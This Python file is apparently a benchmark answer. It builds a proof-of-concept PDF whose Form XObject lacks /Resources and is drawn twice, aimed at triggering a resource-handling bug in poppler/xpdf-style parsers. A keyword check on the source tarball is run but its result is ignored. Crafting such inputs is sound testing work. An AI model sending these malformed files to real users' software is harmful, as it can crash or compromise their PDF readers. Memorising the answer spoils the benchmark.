import os
import tarfile
from typing import List, Optional


def _tar_contains_keywords(tar_path: str, keywords: List[bytes], max_bytes_per_file: int = 256 * 1024) -> bool:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = (m.name or "").lower()
                if any(k.decode(errors="ignore").lower() in name for k in (b"poppler", b"xpdf", b"gfx", b"object.h", b"dict.h")):
                    return True
                if m.size <= 0:
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read(min(m.size, max_bytes_per_file))
                finally:
                    try:
                        f.close()
                    except Exception:
                        pass
                for kw in keywords:
                    if kw in data:
                        return True
    except Exception:
        return False
    return False


def _pdf_stream_obj(extra_dict_kv: bytes, data: bytes) -> bytes:
    if not data:
        length = 0
        return b"<< " + extra_dict_kv + b" /Length 0 >>\nstream\nendstream\n"
    length = len(data)
    return b"<< " + extra_dict_kv + b" /Length " + str(length).encode() + b" >>\nstream\n" + data + b"endstream\n"


def _build_pdf(objects: List[bytes]) -> bytes:
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    out = bytearray(header)
    offsets = [0]
    for i, obj in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode()
        out += obj
        if not obj.endswith(b"\n"):
            out += b"\n"
        out += b"endobj\n"
    xref_off = len(out)
    n = len(objects) + 1
    out += b"xref\n"
    out += f"0 {n}\n".encode()
    out += b"0000000000 65535 f \n"
    for off in offsets[1:]:
        out += f"{off:010d} 00000 n \n".encode()
    out += b"trailer\n"
    out += f"<< /Size {n} /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += str(xref_off).encode() + b"\n"
    out += b"%%EOF\n"
    return bytes(out)


def _make_poc_pdf() -> bytes:
    # A minimal PDF that draws a Form XObject with missing /Resources to force inherited resources handling,
    # then touches resources again immediately afterwards.
    catalog = b"<< /Type /Catalog /Pages 2 0 R >>\n"
    pages = b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>\n"
    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources 4 0 R /Contents 5 0 R >>\n"

    resources = (
        b"<<\n"
        b"  /Font << /F1 7 0 R >>\n"
        b"  /XObject << /X1 6 0 R /X2 6 0 R >>\n"
        b">>\n"
    )

    content = (
        b"q\n"
        b"/X1 Do\n"
        b"Q\n"
        b"/X2 Do\n"
        b"BT\n"
        b"/F1 12 Tf\n"
        b"72 72 Td\n"
        b"(A) Tj\n"
        b"ET\n"
    )
    contents_stream = _pdf_stream_obj(b"", content)

    # Form XObject with missing /Resources
    form_dict_kv = b"/Type /XObject /Subtype /Form /FormType 1 /BBox [0 0 10 10]"
    form_stream = _pdf_stream_obj(form_dict_kv, b"")

    font = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\n"

    return _build_pdf([catalog, pages, page, resources, contents_stream, form_stream, font])


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Prefer PDF PoC; do a light check that the project looks like poppler/xpdf style.
        # If detection fails, still return the PDF; many harnesses accept PDFs.
        try:
            if os.path.isfile(src_path):
                _tar_contains_keywords(
                    src_path,
                    keywords=[
                        b"class Object",
                        b"class Dict",
                        b"Gfx::",
                        b"StandAlone",
                        b"standalone",
                        b"AcroForm",
                        b"Form XObject",
                    ],
                )
        except Exception:
            pass
        return _make_poc_pdf()